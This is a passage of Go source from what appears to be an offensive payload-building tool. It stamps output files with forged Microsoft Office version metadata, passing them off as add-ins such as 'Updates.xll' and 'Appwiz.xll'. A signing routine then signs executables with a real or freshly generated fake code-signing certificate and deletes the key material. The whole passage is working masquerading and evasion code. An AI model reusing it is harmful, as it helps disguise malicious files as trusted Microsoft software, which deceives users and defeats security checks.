			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Timesheet.xll"
		}
		if name == "Reports" {
			vi.StringFileInfo.InternalName = "Reports.xll "
			vi.StringFileInfo.FileDescription = "Report ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Reports.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Reports.xll"
		}
		if name == "Zoom" {
			vi.StringFileInfo.InternalName = "Zoom.xll"
			vi.StringFileInfo.FileDescription = "Zoom Addon ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Zoom.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Zoom.xll"
		}
		if name == "Updates" {
			vi.StringFileInfo.InternalName = "Updates.xll "
			vi.StringFileInfo.FileDescription = "Microsoft Update ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Updates.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Updates.xll"
		}

		if name == "Calendar" {
			vi.StringFileInfo.InternalName = "Calendar.xll "
			vi.StringFileInfo.FileDescription = "Calendar ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Calendar.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Calendar.xll"
		}
		if name == "Memo" {
			vi.StringFileInfo.InternalName = "Memo.xll "
			vi.StringFileInfo.FileDescription = "Memo ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Memo.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Memo.xll"
		}
		if name == "Desk" {
			vi.StringFileInfo.InternalName = "Desk.xll "
			vi.StringFileInfo.FileDescription = "Office Desktop ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Desk.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Desk.xll"
		}

		if name == "Appwiz" {
			vi.StringFileInfo.InternalName = "Appwiz.xll "
			vi.StringFileInfo.FileDescription = "Application Installer ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Appwiz.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 10001
			vi.FixedFileInfo.FileVersion.Build = 10000
			vi.StringFileInfo.InternalName = "Appwiz.xll"
		}
		jitterDefaultVersion(vi)
	}

	vi.Build()
	vi.Walk()

	var archs []string
	archs = []string{"amd64"}
	for _, item := range archs {
		fileout := "fart.syso"
		if err := vi.WriteSyso(fileout, item); err != nil {
			log.Printf("Error writing syso: %v", err)
			os.Exit(3)
		}
	}
	fmt.Println("[+] Created Embedded Resource File With " + name + "'s Properties")
	return name
}

func Signer(domain string, password string, valid string, inputFile string) {
	outFile := inputFile

	if valid != "" {
		fmt.Println("[*] Signing " + inputFile + " With a Valid Cert " + valid)
		os.Rename(inputFile, inputFile+".old")
		inputFile = inputFile + ".old"
		SignExecutable(password, valid, inputFile, outFile)
		os.Remove(inputFile)

	} else {
		// Fake-cert path generates its own PFX password; the -password flag
		// only applies to -valid certs.
		pfxPassword := VarNumberLength(8, 12)
		pfx := domain + ".pfx"
		fmt.Println("[*] Signing " + inputFile + " With a Fake Cert")
		os.Rename(inputFile, inputFile+".old")
		inputFile = inputFile + ".old"
		if err := GenerateCert(domain); err != nil {
			log.Fatalf("Error: %s", err)
		}
		GeneratePFK(pfxPassword, domain)
		SignExecutable(pfxPassword, pfx, inputFile, outFile)
		os.Remove(inputFile)
	}

	if domain != "" {
		os.Remove(domain + ".pem")
		os.Remove(domain + ".key")
		os.Remove(domain + ".pfx")
	}
	fmt.Println("[+] Signed File Created")

}
